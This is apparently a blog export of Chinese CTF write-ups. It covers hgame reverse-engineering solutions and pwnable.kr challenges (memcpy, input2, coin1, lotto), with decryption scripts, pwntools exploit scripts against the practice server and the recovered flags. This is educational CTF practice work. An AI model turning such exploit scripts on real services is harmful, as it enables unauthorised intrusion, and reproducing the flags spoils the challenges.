app-release不熟悉安卓，但是经过一系列网上找资料后查到了如何逆向APK代码，过程很简单，就是将KEY进行sha256计算成16位的key，进行AES加密后在进行base64编码 12345678910111213141516import hashlibimport base64from Cryptodome.Cipher import AESstring = b&#x27;A_HIDDEN_KEY&#x27;flag = b&#x27;EEB23sI1Wd9Gvhvk1sgWyQZhjilnYwCi5au1guzOaIg5dMAj9qPA7lnIyVoPSdRY&#x27;key = hashlib.sha256(string).digest()iv = hashlib.md5(string).digest()Cipher = base64.b64decode(flag)aes = AES.new(key, AES.MODE_CBC, iv)Plain = aes.decrypt(Cipher)print(Plain)# hgame&#123;jUst_A_3z4pp_write_in_k07l1n&#125; RE-week3第三周只做出来一道题 FAKE简单的smc，函数sub_40699B进行了代码解密工作，首先用idaPython将加密后的代码解码便于静态分析 12345678from ida_bytes import *addr1 = 0x0000000000401216addr2 = 0x0000000000409080for i in range(1086): x = get_byte(addr1+i) y = get_byte(addr2+i) patch_byte(addr1+i,x^y) 解密后的关键代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586input = (char *)CmpData;memset(CmpData, 0, 0x90uLL);v38[0] = 55030;v38[1] = 61095;v38[2] = 60151;v38[3] = 57247;v38[4] = 56780;v38[5] = 55726;v38[6] = 46642;v38[7] = 52931;v38[8] = 53580;v38[9] = 50437;v38[10] = 50062;v38[11] = 44186;v38[12] = 44909;v38[13] = 46490;v38[14] = 46024;v38[15] = 44347;v38[16] = 43850;v38[17] = 44368;v38[18] = 54990;v38[19] = 61884;v38[20] = 61202;v38[21] = 58139;v38[22] = 57730;v38[23] = 54964;v38[24] = 48849;v38[25] = 51026;v38[26] = 49629;v38[27] = 48219;v38[28] = 47904;v38[29] = 50823;v38[30] = 46596;v38[31] = 50517;v38[32] = 48421;v38[33] = 46143;v38[34] = 46102;v38[35] = 46744;v37[0] = &#x27;h&#x27;;v37[1] = &#x27;g&#x27;;v37[2] = &#x27;a&#x27;;v37[3] = &#x27;m&#x27;;v37[4] = &#x27;e&#x27;;v37[5] = &#x27;&#123;&#x27;;v37[6] = &#x27;@&#x27;;v37[7] = &#x27;_&#x27;;v37[8] = &#x27;F&#x27;;v37[9] = &#x27;A&#x27;;v37[10] = &#x27;K&#x27;;v37[11] = &#x27;E&#x27;;v37[12] = &#x27;_&#x27;;v37[13] = &#x27;f&#x27;;v37[14] = &#x27;l&#x27;;v37[15] = &#x27;a&#x27;;v37[16] = &#x27;g&#x27;;v37[17] = &#x27;!&#x27;;v37[18] = &#x27;-&#x27;;v37[19] = &#x27;d&#x27;;v37[20] = &#x27;o&#x27;;v37[21] = &#x27;_&#x27;;v37[22] = &#x27;Y&#x27;;v37[23] = &#x27;0&#x27;;v37[24] = &#x27;u&#x27;;v37[25] = &#x27;_&#x27;;v37[26] = &#x27;k&#x27;;v37[27] = &#x27;o&#x27;;v37[28] = &#x27;n&#x27;;v37[29] = &#x27;w&#x27;;v37[30] = &#x27;_&#x27;;v37[31] = &#x27;S&#x27;;v37[32] = &#x27;M&#x27;;v37[33] = &#x27;C&#x27;;v37[34] = &#x27;?&#x27;;v37[35] = &#x27;&#125;&#x27;;v44 = 1;for ( i = 0; i &lt;= 5; ++i )&#123; for ( j = 0; j &lt;= 5; ++j ) &#123; for ( k = 0; k &lt;= 5; ++k ) &#123; LODWORD(input) = CmpData[6 * i + j] + v37[6 * k + j] * *(_DWORD *)&amp;a1[24 * i + 4 * k]; CmpData[6 * i + j] = (int)input; &#125; &#125;&#125; 观察后发现就是一个6*6的矩阵运算，z3解之 123456789101112131415161718192021222324from z3 import *s = Solver()res = [ 55030, 61095, 60151, 57247, 56780, 55726, 46642, 52931, 53580, 50437, 50062, 44186, 44909, 46490, 46024, 44347, 43850, 44368, 54990, 61884, 61202, 58139, 57730, 54964, 48849, 51026, 49629, 48219, 47904, 50823, 46596, 50517, 48421, 46143, 46102, 46744 ]x = [BitVec(&quot;x_%d&quot; % i, 8) for i in range(36)]y = [104,103,97,109,101,123,64,95,70,65,75,69,95,102,108,97,103,33,45,100,111,95,89,48,117,95,107,111,110,119,95,83,77,67,63,125]for i in range(6): for j in range(6): key=0 for n in range(6): key += y[6*n+j]*x[6*i+n] #print(i*6+j) s.add(key == res[i*6+j])flag = &#x27;&#x27;if s.check() == sat: for i in range(36): char = s.model().eval(x[i]).as_long() flag += chr(char) print(flag)# hgame&#123;E@sy_Se1f-Modifying_C0oodee33&#125; helloRE3这道题没有搞出来，后面看wp复现，对于windows消息机制以及带界面的程序逆向不熟悉。 在点击Check时，Dbgview显示order为65并且显示输入长度。 打开ida搜索字符串player找到对应函数，发现有一处 == 65的判定，会给一个值复制为1，x交叉引用发现一只一个函数调用了该全区变量 但是会提示函数无法f5，因为栈指针不平衡。 找到对应的地址，发现有call pop结构，目的是为了将call指令的下一条地址送入rax寄存器中，这里将rax设置为0x00007FF708DE8C3E作为下面rc4加密的秘钥。修复栈指针查看伪代码。 加密流程比较简单，order中的数值取反，RC4加密，比较，RC4的key长度为20，值为地址0x00007FF708DE8C3E处开始的硬编码 12345678910111213141516171819202122232425# python解密脚本from Cryptodome.Cipher import ARC4def decrypt_rc4(): Cipher = bytes([77, 175, 39, 173, 225, 236, 109, 218, 240, 49, 94, 154, 158, 41, 250, 190, 107, 8, 200, 73]) Key = bytes([144, 144, 88, 72, 137, 69, 208, 101, 72, 139, 4, 37, 96, 0, 0, 0, 72, 139, 64, 2]) rc4 = ARC4.new(Key) Plain = rc4.decrypt(Cipher) Plain = list(0xff^i for i in Plain) return Plaindef find_in_order(Plain): order = [i for i in range(21,33)]+[i for i in range(37,50)]+[i for i in range(54,76)] name = list(&#x27;1234567890-+QWERTYUIOP&#123;&#125;|ASDFGHJKL;\\&#x27;~ZXCVBNM,./&#x27;) key = dict(zip(order,name)) # 生成对应的字典 flag = &#x27;&#x27; for i in Plain: flag += key[i] print(flag)find_in_order(decrypt_rc4())# HGAME&#123;6-K4K.4R+3C4T&#125; RE-week4vm 看似很复杂，其实是输入单个字节的加解密，经过动态调试后发现只有异或和减操作，分别对应到的虚拟机指令是4和7，过程为将输入送入vm_eax寄存器，vm_ebx寄存器中是生成的操作数，动态调试即可获得。 123456789101112131415#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;Windows.h&gt;int main()&#123; char cipher[] = &#123; 9, 230, 79, 183, 219, 46, 130, 173, 232, 54, 118, 198, 240, 23, 103, 162, 247, 231, 74, 122, 235, 244, 58, 112, 237, 36, 2, 126, 175, 246, 59, 128, 191, 207 &#125;; char Xor[] = &#123; 0xfe,0x21,0x44,0x67,0x8a,0xad,0xd0,0xf3,0x16,0x39,0x5c,0x7f,0xa3,0xc5,0xe8,0x0b,0x2e,0x51,0x74,0x97,0xba,0xdd,0x0,0x23,0x46,0x69,0x8c,0xaf,0xd2,0xf5,0x18,0x3b,0x5e,0x81 &#125;; char Sub[] = &#123; 0x7A,0x1A,0xBA,0x5A,0xFA,0x9A,0x3A,0xDA,0x7A,0x1A,0xBA,0x5A,0xFB,0x9A,0x3A,0xDA,0x7A,0x1A,0xBA,0x5A,0xFA,0x9A,0x3A,0xDA,0x7A,0x1A,0xBA,0x5A,0xFA,0x9A,0x3A,0xDA,0x7A,0x1A &#125;; for (int i = 33; i &gt;= 0; i--) &#123; printf(&quot;%c&quot;, (cipher[i] + Sub[i]) ^ Xor[i]); &#125;&#125;// hgame&#123;w0W!itS_CpP_wItH_little_vM!&#125; AFiveSecondChallenge比赛时没有做出来，对于c#不熟悉，即使主办方在最后放出了白给Hint，还是搞不出矩阵来，看wp慢慢复现。 首先这是一个扫雷游戏，用c#写的，扫雷的逻辑题目中说明的是通过矩阵运算，所以直接用C#反编译器看看能不能直接搞到源码。但是发现矩阵运算函数被动过手脚。 matrix中的数据很多，根据官方给的提示下载文件中给出了il2cppOutPut文件中有两个重要文件AFiveSecondChallenge和Assembly-CSharp，这两个文件中有游戏中的所有逻辑。这里只分析CheckBombAt函数。 在Assembly-CSharp文件中看到了这些注释，CheckBombAt函数只有一个参数叫Vector2，向量中存储的是数组的坐标，但是matrix数组是一个三维数组，但是这个向量中只存储了x和y坐标。 12345System.Boolean AFiveSecondChallenge.BombChecker::CheckBombAt(UnityEngine.Vector2) BombChecker.CheckBombAt(_position) BombChecker.CheckBombAt(new Vector2(x - 1, y - 1)) 在看AFiveSecondChallenge.cpp文件，直接搜索CheckBomAt关键字，定位到该函数。发现了矩阵与运算的主要逻辑 123456789Vector2_tA85D2DD88578276CA8A8796756458277E72D073D L_21 = ___vec0; // 循环时的变量 float L_22 = L_21.get_x_0(); V_2 = (((double)((double)((float)il2cpp_codegen_subtract((float)(fmodf(L_22, (3.0f))), (float)(1.0f)))))); double L_23 = V_2; double L_24 = V_2; double L_25 = V_0; // y下标 double L_26 = V_2; double L_27 = V_1; // z下标 return (bool)((((double)((double)il2cpp_codegen_add((double)((double)il2cpp_codegen_add((double)((double)il2cpp_codegen_multiply((double)((double)il2cpp_codegen_multiply((double)L_8, (double)L_23)), (double)L_24)), (double)((double)il2cpp_codegen_multiply((double)L_25, (double)L_26)))), (double)L_27))) &gt; ((double)(0.0)))? 1 : 0); 上面的代码化简后就是下面的数学表达式，提取matrix进行图片绘制。 12v_2 = (j % 3) - 1;((x * (v_2 * v_2) + y * v_2 + z) &gt; 0) ? 1 : 0; 12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;Windows.h&gt;int main()&#123; double matrix[45][15][3] = &#123;...&#125;; // 数据太多省略 int map[45][45]; double x, y, z; int dot; for (int i = 0; i &lt; 45; i++) &#123; for (int j = 0; j &lt; 45; j++) &#123; double v_2 = (j % 3) - 1; x = matrix[i][j / 3][0]; y = matrix[i][j / 3][1]; z = matrix[i][j / 3][2]; dot = ((x * (v_2 * v_2) + y * v_2 + z) &gt; 0) ? 1 : 0; map[i][j] = dot; &#125; &#125; for (int i = 0; i &lt; 45; i++) &#123; for (int j = 0; j &lt; 45; j++) &#123; printf(&quot;%d&quot;, map[i][j]); &#125; putchar(&#x27;\\n&#x27;); &#125;&#125; 最后大概是这样，可以看到是一个二维码。 再用python的PIL库将其打印成二维码 12345678910111213141516171819from PIL import ImageMAX = 45img = Image.new(&#x27;RGB&#x27;,(MAX,MAX))dot = &quot;111111100011101111100101000001110100101111111100000100001011111010001110100011001001000001101110101110100100000100111010100101001011101101110101101010111001001001001111101101011101101110101110001100101111111011101111101011101100000101011000100101000100011111000001000001111111101010101010101010101010101010101111111000000001100001101111000111101010000100000000101111100001111010101111111000000000101111100000100010001011011110010110001010001010000001000101111000011001000111010110100010011001110010100001000010001111010011000100111000001100100110101111100101101101010101110010010101001010001011101001011011101100000101101110000110010000111101101001010000100101110010010101100101111011101101110000101111101101101000100110110100101000010101010000101010100001110011100000010001001001000100010111111101101100111000011110100010000010100111000011011001010010011000001010101101011111000000101010011011011001011111111100110100101111110001000110111110111111110001100000011111000100011110010100011101001010101001011101011010110010000101101011010101110001100001010011000110010100011100011100001111111101110011011111110001111110111110001111110011111001100101101000010101001001101001100100110100111010001011001011111111011110010010011001000011110111111111101001000100011111011001111110011100011010101010010100001111000011011011001000001000100011111010000111001000100100101001100110001101100010111110010000011011101010111101010100000100001101011010011001110011100010111111000101110101110110010100111001110010111010001101000100001110010100010110000010111111000000010010110100110101110111100011110011101001101111111011001100100011010110100110100011100010011111101000111000111111100000000001110101000011000111001101101100010100111111100101011000101010100000011000101011110100000101100000110101000111001010110100011111101110101111001110001111110000000101111110000101110101111010011010010010011010001111001111101110101110100010000101010010100100101101100100000100111010110100001100000101111111001100111111101000101001110100110101100000100100010&quot;x = 45for i in range(45): for j in range(45): if dot[i*x+j] == &#x27;1&#x27;: img.putpixel((i,j),(0,0,0)) else: img.putpixel((i,j),(0xff,0xff,0xff)) img.show()img.save(&#x27;flag.png&#x27;)# flag: hgame&#123;YOU~hEn-duO_yOU-X|~DOU-sHi~un1Ty~k4i-fA_de_O&#125; ollvm这个程序对里面所有的字符串进行了加密，需要慢慢寻找加密函数，在动态调试后发现了AES的S_box盒子，且发现加密模式为CBC模式，动调出key与iv后直接写脚本解密，初始iv为0-15 1234567891011121314from Cryptodome.Cipher import AESiv = bytes(i for i in range(16))Cipher = bytes([145, 179, 193, 235, 20, 93, 213, 206, 58, 29, 48, 228, 112, 108, 107, 215, 105, 120, 121, 2, 163, 165, 223, 27, 253, 28, 2, 137, 20, 32, 122, 253, 36, 82, 248, 169, 249, 241, 107, 28, 15, 93, 80, 91, 236, 66, 209, 140, 184, 18, 207, 44, 169, 105, 49, 70, 253, 155, 234, 222, 200, 191, 148, 105])key = b&#x27;CryptoFAILUREforRSA2048Key!!!!!!&#x27;aes = AES.new(key,AES.MODE_CBC,iv)Plain = aes.decrypt(Cipher)print(Plain)# hgame&#123;cOsm0s_is_still_fight1ng_and_NEVER_GIVE_UP_O0o0o0oO00o00o&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"},{"name":"re","slug":"CTF/re","permalink":"http://example.com/categories/CTF/re/"}],"tags":[{"name":"re","slug":"re","permalink":"http://example.com/tags/re/"},{"name":"wp","slug":"wp","permalink":"http://example.com/tags/wp/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"}]},{"title":"pwnable.kr memcpy","slug":"CTF/pwn/pwnable/pwnable.kr-memcpy","date":"2021-07-14T04:44:16.850Z","updated":"2021-08-08T09:36:49.570Z","comments":true,"path":"34917/","link":"","permalink":"http://example.com/34917/","excerpt":"","text":"源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121// compiled with : gcc -o memcpy memcpy.c -m32 -lm#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/mman.h&gt;#include &lt;math.h&gt;unsigned long long rdtsc()&#123; asm(&quot;rdtsc&quot;);&#125;char* slow_memcpy(char* dest, const char* src, size_t len)&#123; int i; for (i=0; i&lt;len; i++) &#123; dest[i] = src[i]; &#125; return dest;&#125;char* fast_memcpy(char* dest, const char* src, size_t len)&#123; size_t i; // 64-byte block fast copy if(len &gt;= 64)&#123; i = len / 64; len &amp;= (64-1); while(i-- &gt; 0)&#123; __asm__ __volatile__ ( &quot;movdqa (%0), %%xmm0\\n&quot; &quot;movdqa 16(%0), %%xmm1\\n&quot; &quot;movdqa 32(%0), %%xmm2\\n&quot; &quot;movdqa 48(%0), %%xmm3\\n&quot; &quot;movntps %%xmm0, (%1)\\n&quot; &quot;movntps %%xmm1, 16(%1)\\n&quot; &quot;movntps %%xmm2, 32(%1)\\n&quot; &quot;movntps %%xmm3, 48(%1)\\n&quot; ::&quot;r&quot;(src),&quot;r&quot;(dest):&quot;memory&quot;); dest += 64; src += 64; &#125; &#125; // byte-to-byte slow copy if(len) slow_memcpy(dest, src, len); return dest;&#125;int main(void)&#123; setvbuf(stdout, 0, _IONBF, 0); setvbuf(stdin, 0, _IOLBF, 0); printf(&quot;Hey, I have a boring assignment for CS class.. :(\\n&quot;); printf(&quot;The assignment is simple.\\n&quot;); printf(&quot;-----------------------------------------------------\\n&quot;); printf(&quot;- What is the best implementation of memcpy? -\\n&quot;); printf(&quot;- 1. implement your own slow/fast version of memcpy -\\n&quot;); printf(&quot;- 2. compare them with various size of data -\\n&quot;); printf(&quot;- 3. conclude your experiment and submit report -\\n&quot;); printf(&quot;-----------------------------------------------------\\n&quot;); printf(&quot;This time, just help me out with my experiment and get flag\\n&quot;); printf(&quot;No fancy hacking, I promise :D\\n&quot;); unsigned long long t1, t2; int e; char* src; char* dest; unsigned int low, high; unsigned int size; // allocate memory char* cache1 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); char* cache2 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); src = mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); size_t sizes[10]; int i=0; // setup experiment parameters for(e=4; e&lt;14; e++)&#123; // 2^13 = 8K low = pow(2,e-1); high = pow(2,e); printf(&quot;specify the memcpy amount between %d ~ %d : &quot;, low, high); scanf(&quot;%d&quot;, &amp;size); if( size &lt; low || size &gt; high )&#123; printf(&quot;don&#x27;t mess with the experiment.\\n&quot;); exit(0); &#125; sizes[i++] = size; &#125; sleep(1); printf(&quot;ok, lets run the experiment with your configuration\\n&quot;); sleep(1); // run experiment for(i=0; i&lt;10; i++)&#123; size = sizes[i]; printf(&quot;experiment %d : memcpy with buffer size %d\\n&quot;, i+1, size); dest = malloc( size ); memcpy(cache1, cache2, 0x4000); // to eliminate cache effect t1 = rdtsc(); slow_memcpy(dest, src, size); // byte-to-byte memcpy t2 = rdtsc(); printf(&quot;ellapsed CPU cycles for slow_memcpy : %llu\\n&quot;, t2-t1); memcpy(cache1, cache2, 0x4000); // to eliminate cache effect t1 = rdtsc(); fast_memcpy(dest, src, size); // block-to-block memcpy t2 = rdtsc(); printf(&quot;ellapsed CPU cycles for fast_memcpy : %llu\\n&quot;, t2-t1); printf(&quot;\\n&quot;); &#125; printf(&quot;thanks for helping my experiment!\\n&quot;); printf(&quot;flag : ----- erased in this source code -----\\n&quot;); return 0;&#125; 过程分析 在申请的内存小于64时，采用的是slow_memcpy逐个字节的复制，没有其他要求，但是速度较慢 1234567char* slow_memcpy(char* dest, const char* src, size_t len)&#123; int i; for (i=0; i&lt;len; i++) &#123; dest[i] = src[i]; &#125; return dest;&#125; 在复制内存大于64个字节时，采用fast_memcpy中的指令复制，复制速度快 1234567891011121314151617181920212223242526char* fast_memcpy(char* dest, const char* src, size_t len)&#123; size_t i; // 64-byte block fast copy if(len &gt;= 64)&#123; i = len / 64; len &amp;= (64-1); while(i-- &gt; 0)&#123; __asm__ __volatile__ ( &quot;movdqa (%0), %%xmm0\\n&quot; &quot;movdqa 16(%0), %%xmm1\\n&quot; &quot;movdqa 32(%0), %%xmm2\\n&quot; &quot;movdqa 48(%0), %%xmm3\\n&quot; &quot;movntps %%xmm0, (%1)\\n&quot; &quot;movntps %%xmm1, 16(%1)\\n&quot; &quot;movntps %%xmm2, 32(%1)\\n&quot; &quot;movntps %%xmm3, 48(%1)\\n&quot; ::&quot;r&quot;(src),&quot;r&quot;(dest):&quot;memory&quot;); dest += 64; src += 64; &#125; &#125; // byte-to-byte slow copy if(len) slow_memcpy(dest, src, len); return dest;&#125; 用使用指令nc pwnable.kr 9022连接，随便输入了一些值过后发现永远停留在了第四次检测，但是如果在本地输入却可以通过 movdqa指令 movdqa指令的操作数都要求16字节对齐，在本地可以正常运行时因为malloc本身就是8字节对齐的，加上8个字节的chunk头，malloc返回的指针就已经遵循16字节对齐了，所以随便输入也可以正常运行，但是在靶机上可能是因为Ubuntu版本的问题，chunk在内存中是连续的，而不遵循内存对齐，所以需要我们自己计算。 123456789# 计算在范围中可输入的数字那些符合要求for i in range(3, 13): if i&lt;6: chunk_size[i-3].append(pow(2,i)) if i &gt;= 6: for size in range(pow(2, i), pow(2, i+1)): if (size-8)%16 == 0: chunk_size[i-3].append(size) exp12345678910111213141516171819202122from pwn import *import oscontext.log_level = &#x27;debug&#x27;sh = remote(&#x27;pwnable.kr&#x27;, 9022)chunk_size = [[], [], [], [], [], [], [], [], [], [], []]for i in range(3, 13): if i&lt;6: chunk_size[i-3].append(pow(2,i)) if i &gt;= 6: for size in range(pow(2, i), pow(2, i+1)): if (size-8)%16 == 0: chunk_size[i-3].append(size)for i in range(3, 13): string = &#x27;specify the memcpy amount between &#123;&#125; ~ &#123;&#125; : &#x27;.format(pow(2,i), pow(2,i+1)) sh.sendlineafter(string, str(chunk_size[i-3][0]))sleep(3)log.success(sh.recv()) 接收","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"},{"name":"pwn","slug":"CTF/pwn","permalink":"http://example.com/categories/CTF/pwn/"},{"name":"pwnable.kr","slug":"CTF/pwn/pwnable-kr","permalink":"http://example.com/categories/CTF/pwn/pwnable-kr/"}],"tags":[{"name":"wp","slug":"wp","permalink":"http://example.com/tags/wp/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"}]},{"title":"pwnable.kr input2","slug":"CTF/pwn/pwnable/pwnable.kr-input2","date":"2021-07-14T04:44:16.840Z","updated":"2021-08-08T09:35:14.030Z","comments":true,"path":"37476/","link":"","permalink":"http://example.com/37476/","excerpt":"","text":"read函数从文件描述符指向的管道口读入指定字节的字符串到指定的数组中 write函数从指定的数组中写入指定数量的字节到指定的文件描述符指向的管道口 常见的 三种 0， 1， 2 分别表示标准输入，标准输入，标准错误 pipe函数dup&amp;dup2函数 复制一份相同的文件描述符 fork函数在当前父进程创建一个子进程，子进程返回得fpid == 0 文件描述符 实例1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;int main()&#123; char buffer2[100]; char buffer[] = &quot;Let&#x27;s study pipe!&quot;; int fd[2]; pid_t fpid; pipe(fd); fpid = fork(); //printf(&quot;%d %d \\n&quot;, fd[0], fd[1]); if(fpid &lt; 0)&#123; perror(&quot;fork error\\n&quot;); &#125; else if(fpid &gt; 0)&#123; //父进程 向管道中写入数据 close(fd[0]); write(fd[1], buffer, strlen(buffer) + 1); printf(&quot;father process input buffer in pipe success!\\n&quot;); &#125; else if(fpid == 0)&#123; //子进程 从管道中读出数据 close(fd[1]); read(fd[0], buffer2, strlen(buffer) + 1); printf(&quot;son process output buffer in pipe success!\\n&quot;); printf(&quot;the buffer in pipe is %s\\n&quot;, buffer2); &#125; return 0;&#125; 上述代码的作用位父进程将buffer字符串数据写入管道中，子进程从管道中读入数据到新数组buffer2中 编译输出后 缓冲区三种缓冲 全缓冲，行缓冲，不缓冲","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"},{"name":"pwn","slug":"CTF/pwn","permalink":"http://example.com/categories/CTF/pwn/"},{"name":"pwnable.kr","slug":"CTF/pwn/pwnable-kr","permalink":"http://example.com/categories/CTF/pwn/pwnable-kr/"}],"tags":[{"name":"wp","slug":"wp","permalink":"http://example.com/tags/wp/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"}]},{"title":"pwnable.kr coin1","slug":"CTF/pwn/pwnable/pwnable.kr-coin1","date":"2021-07-14T04:44:16.840Z","updated":"2021-08-08T09:34:55.093Z","comments":true,"path":"7286/","link":"","permalink":"http://example.com/7286/","excerpt":"","text":"nc连上去看看 一个找假硬币游戏，大概意思为： N是硬币个数，C是输入次数，输入相应的硬币下标会给你硬币的重量（图中输入0代表第一个硬币，10是一个真硬币的重量，输入0,1返回20，代表两个真硬币的重量） 当次数用完时，需要输入假硬币对应的下标， 整理完过后就是一个题目考察我们的二分查找能力，就是写代码能力，但是这个代码我调试了一会儿。。（太菜了）😔 exp脚本里面用到了正则表达式来提取字符串中的数字，参考了这篇文章（链接） 因为链接的端口只开放一分钟，我这儿网速有限，就在pwnable.kr的服务器上去运行代码了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *import redef MakeFlat(low, high): Flat = &#x27;&#x27; mid = (low + high) // 2 for i in range(low, mid): Flat += str(i) + &#x27; &#x27; #log.info(&#x27;[&#x27;+Flat+&#x27;]&#x27;) return Flatdef BinarySearch(n, c): low = 0 high = n correct = &#x27;&#x27; for i in range(c): mid = (low + high) // 2 flat = MakeFlat(low, high) sh.sendline(flat) p = sh.recv() #log.success(p) if int(p) == 9: correct = flat continue if int(p) &lt; (mid - low) * 10: high = mid elif int(p) == (mid - low) * 10: low = mid correct = str(high - 1) log.success(&#x27;correct index: &#x27; + correct) sh.sendline(correct) log.success(sh.recv())def N_C(): #sleep(3) Flat = sh.recv() log.info(Flat) ListOfNaC = map(int, re.findall(&#x27;\\d+&#x27;, Flat)) return ListOfNaCif __name__ == &quot;__main__&quot;: #context.log_level = &#x27;debug&#x27; sh = remote(&#x27;pwnable.kr&#x27;, 9007) sh.recvuntil(&#x27;\\t- Ready? starting in 3 sec... -\\n\\t\\n&#x27;) sleep(3) for i in range(100): _list = N_C() BinarySearch(_list[0], _list[1]) log.success(sh.recv()) sh.close()","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"},{"name":"pwn","slug":"CTF/pwn","permalink":"http://example.com/categories/CTF/pwn/"},{"name":"pwnable.kr","slug":"CTF/pwn/pwnable-kr","permalink":"http://example.com/categories/CTF/pwn/pwnable-kr/"}],"tags":[{"name":"wp","slug":"wp","permalink":"http://example.com/tags/wp/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"}]},{"title":"pwnable.kr lotto","slug":"CTF/pwn/pwnable/pwnable.kr-lotto","date":"2021-07-14T04:44:16.840Z","updated":"2021-08-08T09:36:25.635Z","comments":true,"path":"33592/","link":"","permalink":"http://example.com/33592/","excerpt":"","text":"利用scp命令从服务器下载源码到本地 1scp -P 2222 -r lotto@pwnable.kr: /home/lotto/ /home/fish 程序源代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;unsigned char submit[6];void play()&#123; int i; printf(&quot;Submit your 6 lotto bytes : &quot;); fflush(stdout); int r; r = read(0, submit, 6); printf(&quot;Lotto Start!\\n&quot;); //sleep(1); // generate lotto numbers int fd = open(&quot;/dev/urandom&quot;, O_RDONLY); if(fd==-1)&#123; printf(&quot;error. tell admin\\n&quot;); exit(-1); &#125; unsigned char lotto[6]; if(read(fd, lotto, 6) != 6)&#123; printf(&quot;error2. tell admin\\n&quot;); exit(-1); &#125; for(i=0; i&lt;6; i++)&#123; lotto[i] = (lotto[i] % 45) + 1; // 1 ~ 45 &#125; close(fd); // calculate lotto score int match = 0, j = 0; for(i=0; i&lt;6; i++)&#123; for(j=0; j&lt;6; j++)&#123; if(lotto[i] == submit[j])&#123; match++; &#125; &#125; &#125; // win! if(match == 6)&#123; system(&quot;/bin/cat flag&quot;); &#125; else&#123; printf(&quot;bad luck...\\n&quot;); &#125;&#125;void help()&#123; printf(&quot;- nLotto Rule -\\n&quot;); printf(&quot;nlotto is consisted with 6 random natural numbers less than 46\\n&quot;); printf(&quot;your goal is to match lotto numbers as many as you can\\n&quot;); printf(&quot;if you win lottery for *1st place*, you will get reward\\n&quot;); printf(&quot;for more details, follow the link below\\n&quot;); printf(&quot;http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\\n\\n&quot;); printf(&quot;mathematical chance to win this game is known to be 1/8145060.\\n&quot;);&#125;int main(int argc, char* argv[])&#123; // menu unsigned int menu; while(1)&#123; printf(&quot;- Select Menu -\\n&quot;); printf(&quot;1. Play Lotto\\n&quot;); printf(&quot;2. Help\\n&quot;); printf(&quot;3. Exit\\n&quot;); scanf(&quot;%d&quot;, &amp;menu); switch(menu)&#123; case 1: play(); break; case 2: help(); break; case 3: printf(&quot;bye\\n&quot;); return 0; default: printf(&quot;invalid menu\\n&quot;); break; &#125; &#125; return 0;&#125; 在本地运行程序了解过程，感觉相当于一个猜数游戏，分析程序代码 随机数123456789101112131415// generate lotto numbers int fd = open(&quot;/dev/urandom&quot;, O_RDONLY); if(fd==-1)&#123; printf(&quot;error. tell admin\\n&quot;); exit(-1); &#125; unsigned char lotto[6]; if(read(fd, lotto, 6) != 6)&#123; printf(&quot;error2. tell admin\\n&quot;); exit(-1); &#125; for(i=0; i&lt;6; i++)&#123; lotto[i] = (lotto[i] % 45) + 1; // 1 ~ 45 &#125; close(fd); 上面代码意思为生成6个小于等于45的随机数，刚开始我一个urandom和random是一样的伪随机数，但我用c语言写了一个简单的程序后发现并不一样 12345678910111213141516#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;int main()&#123; int i; unsigned int lotto[6]; int fd = open(&quot;/dev/urandom&quot;, O_RDONLY); read(fd, lotto, 6); for(i = 0; i &lt; 6; i++)&#123; printf(&quot;%d, &quot;,lotto[i] % 45 + 1); &#125; printf(&quot;\\n&quot;);&#125; 生成 a.out文件后运行结果 所以这道题并不能使用伪随机的特性来做 检测继续分析下面的检测函数 12345678int match = 0, j = 0; for(i=0; i&lt;6; i++)&#123; for(j=0; j&lt;6; j++)&#123; if(lotto[i] == submit[j])&#123; match++; &#125; &#125; &#125; 这段代码很有意思，我看第一遍时没想那么多，只是想到了输入的6个字节的顺序不一定要和lotto数组中的数据顺序相同，但是在后面发现这里面存在一个点就是，这没考虑我们输入的6个字节全是一样的情况，可以利用爆破 exp这里注意一点细节是我们输入的字节大小需要小于等于45才可以 1234567891011121314151617from pwn import *#context.log_level = &#x27;debug&#x27;payload = b&#x27;######&#x27;sh = ssh(&#x27;lotto&#x27;, &#x27;pwnable.kr&#x27;, password = &#x27;guest&#x27;, port = 2222)p = sh.process(&#x27;./lotto&#x27;)while True: p.sendline(&#x27;1&#x27;) p.sendlineafter(&#x27;Submit your 6 lotto bytes : &#x27;,payload) msg = p.recv() if &#x27;bad luck&#x27; not in msg: sleep(3) log.success(msg) 